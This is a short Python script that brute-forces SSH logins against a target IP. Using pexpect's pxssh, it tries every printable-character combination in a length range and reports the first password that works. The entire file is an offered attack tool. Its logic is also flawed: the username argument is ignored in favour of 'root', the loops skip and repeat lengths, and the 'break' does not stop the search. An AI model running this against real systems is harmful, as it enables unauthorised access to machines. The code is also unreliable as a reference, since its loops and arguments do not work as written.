from itertools import product
from pexpect import pxssh
import string
import sys

if (len(sys.argv) == 5):
	chars = string.printable

	ip = sys.argv[1]
	username = sys.argv[2]
	minLength = int(sys.argv[3])
	maxLength = int(sys.argv[4])

	count = 0
	for i in range(minLength, maxLength):
		for length in range(minLength, i):
			to_attempt = product(chars, repeat=length)
			for attempt in to_attempt:
				s = pxssh.pxssh()
				try:
					print("---------------------------")
					print("Try no: " + str(count))
					password = ''.join(attempt)
					if (s.login (ip, 'root', password)):
						print("Success logging with pwd: " + password)
						break
						s.logout()
				except Exception as e:
					print ("Failed logging with pwd: " + password + " --> " + str(e))
				
				count += 1;
	print("\n\nThis has been executed " + str(count) + " times.")
else:
	print("Usage: " + sys.argv[0] + " <ip> <username> <minRange> <maxRange>")